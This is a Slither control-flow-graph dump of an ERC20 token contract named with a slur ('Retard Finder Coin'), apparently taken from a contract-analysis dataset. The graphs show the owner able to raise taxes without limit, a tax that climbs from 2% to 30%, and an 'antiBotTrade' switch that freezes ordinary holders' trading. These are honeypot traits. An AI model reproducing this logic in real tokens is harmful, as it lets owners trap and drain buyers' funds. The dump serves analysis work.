Contract: IERC20
==================================================


Contract: IUniswapRouter
==================================================


Contract: IUniswapFactory
==================================================


Contract: Ownable
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: msgSender = msg.sender

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = msgSender

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(address(0),msgSender)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: transferOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(newOwner != address(0),new is 0)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,newOwner)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _owner = newOwner

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1


Contract: Token
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _name = Retard Finder Coin

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _symbol = RFC

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _decimals = 18

  ID: 4
  Type: NodeType.VARIABLE
  Expression: Supply = 1_000_000_000

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _totalSupply = Supply * 10 ** _decimals

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: swapAtAmount = _totalSupply / 20000

  ID: 7
  Type: NodeType.VARIABLE
  Expression: receiveAddr = msg.sender

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: _balances[receiveAddr] = _totalSupply

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),receiveAddr,_totalSupply)

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: mkt = address(receiveAddr)

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: team = address(receiveAddr)

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: _isExcludeFromFee[address(this)] = true

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: _isExcludeFromFee[receiveAddr] = true

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: _isExcludeFromFee[mkt] = true

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: _isExcludeFromFee[team] = true

  ID: 16
  Type: NodeType.VARIABLE
  Expression: swapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: _uniswapRouter = swapRouter

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: _allowances[address(this)][address(swapRouter)] = MAX

  ID: 19
  Type: NodeType.VARIABLE
  Expression: swapFactory = IUniswapFactory(swapRouter.factory())

  ID: 20
  Type: NodeType.EXPRESSION
  Expression: _uniswapPair = swapFactory.createPair(address(this),swapRouter.WETH())

  ID: 21
  Type: NodeType.EXPRESSION
  Expression: isMarketPair[_uniswapPair] = true

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: IERC20(_uniswapRouter.WETH()).approve(address(address(_uniswapRouter)),~ uint256(0))

  ID: 23
  Type: NodeType.EXPRESSION
  Expression: _isExcludeFromFee[address(swapRouter)] = true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17
  17 -> 18
  18 -> 19
  19 -> 20
  20 -> 21
  21 -> 22
  22 -> 23

Function: owner
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _owner

Edges:
  0 -> 1

Function: renounceOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,address(0))

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _owner = address(0)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: transferOwnership
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(newOwner != address(0),new is 0)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: OwnershipTransferred(_owner,newOwner)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _owner = newOwner

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: setMKT
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: mkt = newMKT

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: team = newTeam

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: symbol
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _symbol

Edges:
  0 -> 1

Function: name
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _name

Edges:
  0 -> 1

Function: decimals
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _decimals

Edges:
  0 -> 1

Function: totalSupply
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _totalSupply

Edges:
  0 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _balances[account]

Edges:
  0 -> 1

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transfer(msg.sender,recipient,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _allowances[owner][spender]

Edges:
  0 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _approve(msg.sender,spender,amount)

  ID: 2
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _transfer(sender,recipient,amount)

  ID: 2
  Type: NodeType.IF
  Expression: _allowances[sender][msg.sender] != MAX

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount

  ID: 4
  Type: NodeType.ENDIF
  Expression: 

  ID: 5
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  2 -> 4
  3 -> 4
  4 -> 5

Function: _approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _allowances[owner][spender] = amount

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: Approval(owner,spender,amount)

Edges:
  0 -> 1
  1 -> 2

Function: _basicTransfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _balances[sender] -= amount

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _balances[recipient] += amount

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: Transfer(sender,recipient,amount)

  ID: 4
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: recuseTax
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _finalBuyTax = newBuy

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _finalSellTax = newSell

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _reduceBuyTaxAt = newReduceBuy

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _reduceSellTaxAt = newReduceSell

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _preventSwapBefore = newPreventSwapBefore

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 1

Function: setSwapAtAmount
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: swapAtAmount = newValue

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: _transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: balance = balanceOf(from)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(balance >= amount,balanceNotEnough)

  ID: 3
  Type: NodeType.IF
  Expression: inSwap

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _basicTransfer(from,to,amount)

  ID: 5
  Type: NodeType.RETURN
  Expression: 

  ID: 6
  Type: NodeType.ENDIF
  Expression: 

  ID: 7
  Type: NodeType.VARIABLE
  Expression: 

  ID: 8
  Type: NodeType.IF
  Expression: isMarketPair[to] && ! inSwap && ! _isExcludeFromFee[from] && ! _isExcludeFromFee[to] && _buyCount > _preventSwapBefore

  ID: 9
  Type: NodeType.VARIABLE
  Expression: _numSellToken = amount

  ID: 10
  Type: NodeType.IF
  Expression: _numSellToken > balanceOf(address(this))

  ID: 11
  Type: NodeType.EXPRESSION
  Expression: _numSellToken = _balances[address(this)]

  ID: 12
  Type: NodeType.ENDIF
  Expression: 

  ID: 13
  Type: NodeType.IF
  Expression: _numSellToken > swapAtAmount

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: swapTokenForETH(_numSellToken)

  ID: 15
  Type: NodeType.ENDIF
  Expression: 

  ID: 16
  Type: NodeType.ENDIF
  Expression: 

  ID: 17
  Type: NodeType.IF
  Expression: ! _isExcludeFromFee[from] && ! _isExcludeFromFee[to] && ! inSwap

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: require(bool)(startTradeBlock > 0)

  ID: 19
  Type: NodeType.EXPRESSION
  Expression: takeFee = true

  ID: 20
  Type: NodeType.IF
  Expression: isMarketPair[from] && to != address(_uniswapRouter) && ! _isExcludeFromFee[to]

  ID: 21
  Type: NodeType.EXPRESSION
  Expression: _buyCount ++

  ID: 22
  Type: NodeType.ENDIF
  Expression: 

  ID: 23
  Type: NodeType.ENDIF
  Expression: 

  ID: 24
  Type: NodeType.EXPRESSION
  Expression: _transferToken(from,to,amount,takeFee)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 6
  4 -> 5
  6 -> 7
  7 -> 8
  8 -> 9
  8 -> 16
  9 -> 10
  10 -> 11
  10 -> 12
  11 -> 12
  12 -> 13
  13 -> 14
  13 -> 15
  14 -> 15
  15 -> 16
  16 -> 17
  17 -> 18
  17 -> 23
  18 -> 19
  19 -> 20
  20 -> 21
  20 -> 22
  21 -> 22
  22 -> 23
  23 -> 24

Function: _transferToken
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _balances[sender] = _balances[sender] - tAmount

  ID: 2
  Type: NodeType.VARIABLE
  Expression: 

  ID: 3
  Type: NodeType.IF
  Expression: takeFee

  ID: 4
  Type: NodeType.VARIABLE
  Expression: 

  ID: 5
  Type: NodeType.IF
  Expression: isMarketPair[recipient]

  ID: 7
  Type: NodeType.IF
  Expression: isMarketPair[sender]

  ID: 9
  Type: NodeType.ENDIF
  Expression: 

  ID: 10
  Type: NodeType.ENDIF
  Expression: 

  ID: 11
  Type: NodeType.VARIABLE
  Expression: swapAmount = tAmount * taxFee / 100

  ID: 12
  Type: NodeType.IF
  Expression: swapAmount > 0

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: feeAmount += swapAmount

  ID: 14
  Type: NodeType.EXPRESSION
  Expression: _balances[address(this)] = _balances[address(this)] + swapAmount

  ID: 15
  Type: NodeType.EXPRESSION
  Expression: Transfer(sender,address(this),swapAmount)

  ID: 16
  Type: NodeType.ENDIF
  Expression: 

  ID: 17
  Type: NodeType.ENDIF
  Expression: 

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: _balances[recipient] = _balances[recipient] + (tAmount - feeAmount)

  ID: 19
  Type: NodeType.EXPRESSION
  Expression: Transfer(sender,recipient,tAmount - feeAmount)

  ID: 20
  Type: NodeType.IF
  Expression: _buyCount > _reduceSellTaxAt

  ID: 21
  Type: NodeType.EXPRESSION
  Expression: taxFee = _finalSellTax

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: taxFee = _initialSellTax

  ID: 23
  Type: NodeType.ENDIF
  Expression: 

  ID: 24
  Type: NodeType.IF
  Expression: _buyCount > _reduceBuyTaxAt

  ID: 25
  Type: NodeType.EXPRESSION
  Expression: taxFee = _finalBuyTax

  ID: 26
  Type: NodeType.EXPRESSION
  Expression: taxFee = _initialBuyTax

  ID: 27
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 17
  4 -> 5
  5 -> 20
  5 -> 7
  7 -> 24
  7 -> 9
  9 -> 10
  10 -> 11
  11 -> 12
  12 -> 13
  12 -> 16
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17
  17 -> 18
  18 -> 19
  20 -> 21
  20 -> 22
  21 -> 23
  22 -> 23
  23 -> 10
  24 -> 25
  24 -> 26
  25 -> 27
  26 -> 27
  27 -> 9

Function: startTrade
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(startTradeBlock == 0,already start)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: startTradeBlock = block.number

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 3
  1 -> 2
  3 -> 1

Function: antiBotTrade
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: startTradeBlock = 0

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: removeERC20
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool)(msg.sender == mkt)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: IERC20(_token).transfer(mkt,IERC20(_token).balanceOf(address(this)))

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: mkt.transfer(address(this).balance)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: swapTokenForETH
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: path = new address[](2)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: path[0] = address(this)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: path[1] = _uniswapRouter.WETH()

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp)

  ID: 5
  Type: NodeType.VARIABLE
  Expression: _bal = address(this).balance

  ID: 6
  Type: NodeType.IF
  Expression: _bal > 10000000000000000

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: mkt.transfer(_bal / 10)

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: team.transfer(address(this).balance)

  ID: 9
  Type: NodeType.ENDIF
  Expression: 

  ID: 10
  Type: NodeType.EXPRESSION
  Expression: lockTheSwap()

Edges:
  0 -> 10
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  6 -> 9
  7 -> 8
  8 -> 9
  10 -> 1

Function: setMarketingFreeTrade
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _isExcludeFromFee[account] = value

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _buyCount = 0

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _initialBuyTax = 2

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _initialSellTax = 2

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _finalBuyTax = 30

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _finalSellTax = 30

  ID: 5
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _reduceBuyTaxAt = 29

  ID: 6
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _reduceSellTaxAt = 29

  ID: 7
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _preventSwapBefore = 40

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7

Function: slitherConstructorConstantVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: MAX = ~ uint256(0)

Edges:


